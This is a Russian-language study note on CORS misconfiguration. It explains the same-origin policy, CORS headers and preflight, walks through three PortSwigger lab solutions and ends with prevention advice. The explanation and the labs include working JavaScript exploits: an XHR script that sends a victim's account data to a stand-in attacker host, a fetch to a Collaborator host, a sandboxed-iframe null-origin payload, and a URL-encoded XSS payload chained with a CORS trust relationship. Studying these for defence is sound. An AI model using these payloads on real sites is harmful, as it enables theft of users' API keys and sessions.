---
topic: application-security
level: intermediate
status: source-review-complete
last_reviewed: 2026-08-17
verified_against: https://fetch.spec.whatwg.org/
---

> [!note] Проверка источников завершена
> Базовая линия: WHATWG Fetch и OWASP. Исторические payload-примеры ниже сохранены для разбора, но не считаются рекомендацией для реальных систем; практику выполняйте только в назначенной лаборатории внешней учебной платформы и в пределах её правил.

> [!note] Статус материала
> Исходный конспект сохранён. Перед учебной практикой необходимо сверить команды, версии инструментов и внешние ссылки с первичными источниками.

# Введение

#CORS

---

## Что такое CORS (обмен ресурсами между источниками)?

**Cross-origin resource sharing (CORS)** — это браузерный механизм, который позволяет контролировать доступ к ресурсам, находящимся вне определённого домена. Он расширяет и добавляет гибкость политике **same-origin policy (SOP)**. Однако он также создаёт потенциал для междоменных (cross-domain) атак, если политика CORS сайта плохо настроена и реализована. CORS не является защитой от cross-origin атак, таких как cross-site request forgery (CSRF).

> **CORS** сравнивает **схему** (протокол передачи данных), **порт** и **домен верхнего уровня.**

![[Pasted image 20260121121558.png]]

---

## Same-origin policy

**Политика одного источника (SOP)** — это ограничительная cross-origin политика, которая ограничивает возможность взаимодействия сайта с ресурсами вне исходного домена. Политика одного источника была определена много лет назад в ответ на потенциально вредоносные междоменные взаимодействия, например, когда один сайт крадет личные данные с другого. Обычно она позволяет домену отправлять запросы другим доменам, но не иметь доступ к ответам.

---

## Смягчение Same-origin policy (SOP)

Политика одного источника очень ограничительна, поэтому были разработаны различные подходы для обхода этих ограничений. Многие веб-сайты взаимодействуют с поддоменами или сторонними сайтами таким образом, что требуется полный междоменный доступ. Контролируемое ослабление политики одного источника возможно с помощью политики **cross-origin resource sharing (CORS)**.

Протокол **cross-origin resource sharing (CORS)** использует набор HTTP-заголовков, которые определяют доверенные веб-источники и связанные с ними свойства, такие как разрешение аутентифицированного доступа. Ориджин связывается через обмен заголовками между браузером и кросс-доменным веб-сайтом, к которому он пытается получить доступ.

---

# CORS заголовки

> [!info] Acess-Control-Alow-Origin
> Поле, отвечающее за доверенные веб-домены. Если оно настроено неправильно - например подставляется динамически, то это будет уязвимостью.
> > Принимает 3 значения: **\***, **\<origin>**, **null**.

> [!info] Acess-Control-Alow-Credentials
> Позволяет передавать **cookie** в значении **true** или запрещает в - **false**.
> >[!warning] Комбинация с **Acess-Control-Alow-Origin: \***
> >Если сервер настроен с значением заголовка "**Acess-Control-Alow-Origin: \***", то использование учётных данных не допускается.

> [!info] Acess-Control-Alow-Methods
Указывает допустимые для запроса методы: PUT, POST, OPTIONS.

> [!info] Acess-Control-Alow-Headers
Указывает дополнительные разрешённые заголовки в запросе.

> [!info] Acess-Control-Max-Age: \<delta-seconds>
Количество секунд, на которое запрос может быть кеширован. Максимальное значение в Firefox составляет 24 часа (86400 секунд), в Chromium 10 минут (600 секунд). Chromium также определяет значение по умолчанию 5 секунд. 
>> Значение **-1** отменяет кеширование, отправляя предзапрос перед каждым запросом.

---

## Pre-fight Requests

#Pre-fight_Requests

---

### Что такое CORS Preflight Request

**Preflight request** — это **автоматический HTTP-запрос**, который браузер **отправляет перед основным запросом**, чтобы спросить сервер:

> «Можно ли мне вообще отправлять такой запрос из другого origin?»

Он **не пишется разработчиком** — его полностью контролирует браузер.

### Как выглядит preflight

Это **HTTP OPTIONS-запрос**:
``` http
OPTIONS /accountDetails HTTP/1.1
Origin: https://evil.com
Access-Control-Request-Method: GET
Access-Control-Request-Headers: Authorization
```

Если сервер ответит правильно — браузер разрешит **настоящий запрос**.

### Зачем нужен preflight

Он защищает от:
- несанкционированных **CORS-запросов**
- скрытых запросов с нестандартными методами и заголовками
- утечки данных через JS

Важно: **preflight — это защита браузера, а не сервера**.

---

### Когда preflight СРАБАТЫВАЕТ

Preflight выполняется, если запрос **НЕ является simple request**.

#### 🔹 Simple request — БЕЗ preflight

Все условия должны выполняться одновременно:

1️⃣ HTTP-метод: `GET POST HEAD`

2️⃣ Заголовки (только эти):

```http
Accept 
Accept-Language 
Content-Language 
Content-Type
```

3️⃣ Content-Type (если есть), то только:

```http
application/x-www-form-urlencoded 
multipart/form-data 
text/plain
```

Если **хотя бы одно условие нарушено** → будет preflight.

---

### 🔹 НЕ-simple → preflight

Preflight срабатывает, если есть:

|Причина|Пример|
|---|---|
|Нестандартный метод|PUT, DELETE, PATCH|
|Кастомный заголовок|Authorization, X-API-Key|
|Content-Type = JSON|application/json|
|`credentials: include` + CORS|часто|
|Явно указаны headers в fetch|даже пустые|

---

# Уязвимости, возникающие из-за проблем конфигурации CORS

Многие современные сайты используют CORS для получения доступа с субдоменов и доверенных сторон. Реализация CORS может содержать ошибки или быть слишком снисходительной, чтобы всё работало, что может привести к уязвимостям, которые можно использовать для эксплуатации.

---

## Серверный заголовок ACAO из заголовка Origin, заданного клиентом

Некоторые приложения должны предоставлять доступ к ряду других областей. Поддержание списка разрешённых доменов требует постоянных усилий, и любые ошибки могут привести к нарушению функциональности. Поэтому некоторые приложения выбирают простой путь — эффективно разрешают доступ из любого другого домена.

Один из способов сделать это — прочитать заголовок Origin из запросов и включить ответный заголовок, указывающий, что запросующий источник разрешен. Например, рассмотрим приложение, которое получает следующий запрос:

```http
GET /sensitive-victim-data HTTP/1.1 
Host: vulnerable-website.com 
Origin: https://malicious-website.com 
Cookie: sessionid=...
```

Затем он отвечает следующим образом:

```http
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: https://malicious-website.com 
Access-Control-Allow-Credentials: true ...
```

В этих заголовках указано, что доступ разрешен из запрашивающего домена (`malicious-website.com`), и что кросс-исходные запросы могут содержать cookie (`Access-Control-Allow-Credentials: true`), поэтому будут обрабатываться в процессе сессии. 

Поскольку приложение отражает произвольные источники в заголовке `Access-Control-Allow-Origin`, это означает, что абсолютно любой домен может получить доступ к ресурсам из уязвимого домена. Если в ответе содержится какая-либо чувствительная информация, такая как API или CSRF-токен, вы можете получить её, разместив следующий скрипт на вашем сайте: 

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true); 
req.withCredentials = true; 
req.send(); 

function reqListener() { 
	location='//malicious-website.com/log?key='+this.responseText; 
};
```

Некоторые приложения, поддерживающие доступ из нескольких источников, делают это с помощью белого списка разрешённых источников. Когда поступает запрос CORS, предоставленный источник сравнивается с белым списком. Если origin появляется в белом списке, он отражается в заголовке `Access-Control-Allow-Origin`, чтобы получить доступ. Например, приложение получает обычный запрос, например: 

```http
GET /data HTTP/1.1 
Host: normal-website.com ... 
Origin: https://innocent-website.com
```

Приложение проверяет предоставленный источник по его списку разрешённых источников и, если он есть в списке, отражает происхождение следующим образом:

```http
HTTP/1.1 200 OK 
... 
Access-Control-Allow-Origin: https://innocent-website.com
```

Ошибки часто возникают при внедрении белых списков CORS. Эти правила часто реализуются путём сопоставления префиксов или суффиксов URL, либо использования регулярных выражений. 

> [!warning] Ошибки сравнения с белым списком
>1. Например, предположим, что приложение предоставляет доступ ко всем доменам, заканчивающимся на `normal-website.com`.
> >Злоумышленник может получить доступ, зарегистрировав домен: `hackersnormal-website.com`.
>
>2. Или, предположим, что приложение предоставляет доступ ко всем доменам, начинающимся с `normal-website.com`.
> > Злоумышленник может получить доступ с помощью домена: `normal-website.com.evil-user.net`.

> [!warning] В белом списке нулевое начало
> Спецификация для заголовка Origin поддерживает значение `null`. Браузеры могут отправлять значение `null` в заголовке Origin в различных необычных ситуациях: 
> - Cross-origin redirects.
> - Запросы из сериализированных данных.
> - Запрос с помощью протокола `file:`. 
> - Песочницы для cross-origin запросов.

---

## Использование XSS через доверительные отношения CORS

Даже «правильно» настроенный CORS устанавливает доверительные отношения между двумя источниками. Если сайт доверяет источнику, уязвимому к межсайтовому скриптингу (XSS), злоумышленник может использовать XSS для внедрения JavaScript, использующего CORS для извлечения конфиденциальной информации с сайта, доверяющего уязвимому приложению.

Пусть будет следующий запрос:
```http
GET /api/requestApiKey HTTP/1.1 
Host: vulnerable-website.com 
Origin: https://subdomain.vulnerable-website.com 
Cookie: sessionid=...
```

Если сервер отвечает:
```http
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com 
Access-Control-Allow-Credentials: true
```

Тогда злоумышленник, обнаруживший уязвимость XSS на `subdomain.vulnerable-website.com`, может использовать её для извлечения ключа API, используя URL вроде следующего значения: 

```url
https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
```

---

### Нарушение TLS с плохо настроенным CORS

Предположим, что приложение, строго использующее HTTPS, также внесёт в белый список доверенный поддомен, использующий обычный HTTP. Например, когда приложение получает следующий запрос:

```http
GET /api/requestApiKey HTTP/1.1 
Host: vulnerable-website.com 
Origin: http://trusted-subdomain.vulnerable-website.com 
Cookie: sessionid=...
```

Сервер отвечает следующим образом:

```http
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com 
Access-Control-Allow-Credentials: true
```

---

## Интранеты и CORS без удостоверений

Большинство CORS-атак зависят от наличия ответного заголовка: `Access-Control-Allow-Credentials: true`

Без этого заголовка браузер пользователя-жертвы откажется отправлять свои файлы cookie, а значит, злоумышленник получит доступ только к неаутентифицированному контенту, к которому он может получить доступ напрямую на целевом сайте.

Однако существует одна распространённая ситуация, когда злоумышленник не может получить прямой доступ к сайту: если он является частью интранета организации и находится в частном IP-адресном пространстве. Внутренние сайты часто соответствуют более низким стандартам безопасности, чем внешние, что позволяет злоумышленникам находить уязвимости и получать дополнительный доступ. Например, cross-origin запрос внутри частной сети может быть выполнен следующим образом:

```http
GET /reader?url=doc1.pdf 
Host: intranet.normal-website.com 
Origin: https://normal-website.com
```

И сервер отвечает:
```http
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: *
```

---

### Справка по случаям, создающим  CORS-like уязвимости

>![[CORS уязвимости.png]]

---

# Лабораторные

---

## Lab: CORS vulnerability with basic origin reflection

https://portswigger.net/web-security/learning-paths/cors/cors-vulnerabilities-arising-from-cors-configuration-issues/cors/lab-basic-origin-reflection-attack

1. Меняем почту, смотрим историю proxy:
   > 1. API ключ получен через метод `GET /accountDetails`;
   > 2. Заголовок `Access-Control-Allow-Credentials: true` означает, что cookie могут передаваться между same-origin.
2. Отправим запрос повторно с добавленным заголовком: 
   ``` http
   Origin: https://example.com
   ```
   > Ответ: 
   > ``` http
   > Access-Control-Allow-Origin: https://example.com
   > Access-Control-Allow-Credentials: true
   > ```
   > Значит разрешён обмен данными между всеми same-origin с учётом сессии из cookie.
3. На эксплойт сервере используем скрипт:
   ```html
   <script> 
	   var req = new XMLHttpRequest(); // стандартный браузерный API для выполнения HTTP-запросов
	   req.onload = reqListener; // событие, которое срабатывает когда запрос успешно завершился
	   req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); // запрос выполняется из браузера жертвы при посещении сайта злоумышленника
	   req.withCredentials = true; // браузер приложит cookies (session, auth, JWT)
	   req.send(); // Запрос уходит на сервер
	   
	   function reqListener() { // Браузер перенаправляется на /log?key=<ДАННЫЕ_АККАУНТА>, чтобы сохранить полученные данные
		   location='/log?key='+this.responseText;
	   }; 
    </script>
   ```
   > Объяснение:
   > 1. **От имени жертвы** отправляет запрос к эндпоинту `/accountDetails`
   > 2. **Передаёт куки пользователя** (сессию)
   > 3. **Получает конфиденциальные данные**
   > 4. **Пересылает их злоумышленнику** через редирект на `/log`
4. Получаем в логах данные администратора:
   ``` url
   log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22PMLLCQpRZpyy6cBfx1ewaqmoO2S4rAX6%22,%20%20%22sessions%22:%20[%20%20%20%20%22242Y0zn0LVbstBsSll753tQ9PjI7nMKF%22%20%20]}
   ```
   > Декодируем URL:
   > ```json
   > {  "username": "administrator",  "email": "",  "apikey": "PMLLCQpRZpyy6cBfx1ewaqmoO2S4rAX6",  "sessions": [    "242Y0zn0LVbstBsSll753tQ9PjI7nMKF"  ]}
   > ```
   

>Способ 2: 
>```javascript
><script>
>    var req = new XMLHttpRequest();
>   req.onload = reqListener;
>    req.open('get','https://domain-A/accountDetails',true);
>    req.withCredentials = true;
>    req.send();
>
>    function reqListener() {
>        var all = this.responseText;
>      fetch('https://COLLABORATOR.oastify.com', { method: 'POST', mode: 'no-cors', body: all });
>  };
></script>
>```

   
---

## Lab: CORS vulnerability with trusted null origin

https://portswigger.net/web-security/learning-paths/cors/cors-vulnerabilities-arising-from-cors-configuration-issues/cors/lab-null-origin-whitelisted-attack

1. Меняем почту, смотрим историю proxy:
   > 1. API ключ получен через метод `GET /accountDetails`;
   > 2. Заголовок `Access-Control-Allow-Credentials: true` означает, что cookie могут передаваться между same-origin.
2. Отправим запрос повторно с добавленным заголовком: 
   ``` http
   Origin: null
   ```
   > Ответ: 
   > ``` http
   > Access-Control-Allow-Origin: null
   > Access-Control-Allow-Credentials: true
   > ```
   > Значит разрешён обмен данными между всеми same-origin = null с учётом сессии из cookie.
3. На эксплойт сервере используем скрипт:
   ```html
   <iframe sandbox="allow-scripts" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = () => location='/exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/api?key='+encodeURIComponent(req.responseText);
    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
</script>"></iframe>
   ```
   > Почему это работает
   > - `sandbox` **убирает origin**
   > - `allow-scripts` — разрешает выполнение JS
   > - `allow-same-origin` **НЕ указан** → origin становится `null`
   > - Браузер отправляет: `Origin: null`
   
 >❌ Способ 2: `data:` URL (если разрешён)
 >
 >Современные браузеры (и особенно Chromium) **блокируют или silently ignore** переходы `location = "data:text/html,..."`, поэтому следующий код не сработает если:
   >  - навигация инициирована скриптом
   >  - документ не sandboxed
   >  - есть CSP / security restrictions
   >  
> Но способ можно рассматривать в целом.
>
>`data:` всегда имеет opaque origin → `Origin: null`.
>
>```html
><script>
>	location = 'data:text/html,<script>...</script>'
></script>
>```
>⚠️ Работает **только если CSP не блокирует `data:`**.
>
>Пример работы `data:`
>``` html
>data:text/html,<script>location='https://www.google.com'</script>
>```

---

## Lab: CORS vulnerability with trusted insecure protocols

https://portswigger.net/web-security/learning-paths/cors/cors-vulnerabilities-arising-from-cors-configuration-issues/cors/lab-breaking-https-attack

1. Меняем почту, смотрим историю proxy:
   > 1. API ключ получен через метод `GET /accountDetails`;
   > 2. Заголовок `Access-Control-Allow-Credentials: true` означает, что cookie могут передаваться между same-origin.
2. Отправим запрос повторно с добавленным заголовком: 
   ``` http
   Origin: qwe.YOUR-LAB-ID.web-security-academy.net
   ```
   > Ответ: 
   > ``` http
   > Access-Control-Allow-Origin: https://qwe.YOUR-LAB-ID.web-security-academy.net
   > Access-Control-Allow-Credentials: truee
   > ```
   > Значит разрешён обмен данными между всеми поддоменами от `*.YOUR-LAB-ID.web-security-academy.net` с учётом сессии из cookie.
  3. Заметим, что функционал проверки наличия товара - это обращение на поддомен основного сайта:
     ``` http
     GET /?productId=1&storeId=1 HTTP/1.1
     Host: stock.YOUR-LAB-ID.web-security-academy.net
     ``` 
     > На этом же сайте в параметре `productId` есть XSS.

4. Теперь необходимо собрать ссылку на `stock.YOUR-LAB-ID.web-security-academy.net`, которая через XSS будет запрашивать API `accountDetails` и направлять полученные данные в логи эксплойт сервера. Используем скрипт:
	``` html
	<script> 
	   var req = new XMLHttpRequest();
	   req.onload = () => location='https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/api?key='+req.responseText;
	   req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
	   req.withCredentials = true;
	   req.send();
	 </script>
	```
	Переведём его у URL:
	```
	%3c%73%63%72%69%70%74%3e%20%0a%20%20%20%76%61%72%20%72%65%71%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0a%20%20%20%72%65%71%2e%6f%6e%6c%6f%61%64%20%3d%20%28%29%20%3d%3e%20%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%59%4f%55%52%2d%45%58%50%4c%4f%49%54%2d%53%45%52%56%45%52%2d%49%44%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%61%70%69%3f%6b%65%79%3d%27%2b%72%65%71%2e%72%65%73%70%6f%6e%73%65%54%65%78%74%3b%0a%20%20%20%72%65%71%2e%6f%70%65%6e%28%27%67%65%74%27%2c%27%68%74%74%70%73%3a%2f%2f%59%4f%55%52%2d%4c%41%42%2d%49%44%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%61%63%63%6f%75%6e%74%44%65%74%61%69%6c%73%27%2c%74%72%75%65%29%3b%0a%20%20%20%72%65%71%2e%77%69%74%68%43%72%65%64%65%6e%74%69%61%6c%73%20%3d%20%74%72%75%65%3b%0a%20%20%20%72%65%71%2e%73%65%6e%64%28%29%3b%0a%20%3c%2f%73%63%72%69%70%74%3e
	```
5. На эксплойт сервере установим моментальный редирект на уязвимый поддомен:
   ``` js
   <script>
document.location='http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=%3c%73%63%72%69%70%74%3e%20%0a%20%20%20%76%61%72%20%72%65%71%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0a%20%20%20%72%65%71%2e%6f%6e%6c%6f%61%64%20%3d%20%28%29%20%3d%3e%20%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%59%4f%55%52%2d%45%58%50%4c%4f%49%54%2d%53%45%52%56%45%52%2d%49%44%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%61%70%69%3f%6b%65%79%3d%27%2b%72%65%71%2e%72%65%73%70%6f%6e%73%65%54%65%78%74%3b%0a%20%20%20%72%65%71%2e%6f%70%65%6e%28%27%67%65%74%27%2c%27%68%74%74%70%73%3a%2f%2f%59%4f%55%52%2d%4c%41%42%2d%49%44%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%61%63%63%6f%75%6e%74%44%65%74%61%69%6c%73%27%2c%74%72%75%65%29%3b%0a%20%20%20%72%65%71%2e%77%69%74%68%43%72%65%64%65%6e%74%69%61%6c%73%20%3d%20%74%72%75%65%3b%0a%20%20%20%72%65%71%2e%73%65%6e%64%28%29%3b%0a%20%3c%2f%73%63%72%69%70%74%3e&storeId=1'</script>
   ```

---

# Как предотвратить атаки на основе CORS

Уязвимости CORS возникают прежде всего из-за неправильной конфигурации. 

1. Если веб-ресурс содержит конфиденциальную информацию, origin должен быть корректно указано в заголовке `Access-Control-Allow-Origin`. 
2. Origin в `Access-Control-Allow-Origin` должен касаться только доверенных сайтов. В частности, динамическое отражение источников из cross-origin запросов без валидации легко эксплуатируется и следует избегать. 
3. Избегайте внесения в белый список `null`. Избегайте использования `Access-Control-Allow-Origin: null` . Cross-origin запросы ресурсов из внутренних документов и песочниц могут указывать origin `null`. Заголовки CORS должны быть правильно определены с учётом доверенных источников для частных и публичных серверов. 
4. Избегайте подстановочных знаков (wildcards) во внутренних сетях. Доверять только сетевой конфигурации для защиты внутренних ресурсов недостаточно, когда внутренние браузеры могут получить доступ к ненадёжным внешним доменам.
5. CORS не заменяет серверные политики безопасности. CORS определяет поведение браузера и никогда не заменяет серверную защиту конфиденциальных данных — злоумышленник может напрямую подделать запрос из любого доверенного источника. Поэтому веб-серверы должны продолжать применять защиту для конфиденциальных данных, такие как аутентификация и управление сессиями, а также правильно настроенный CORS.
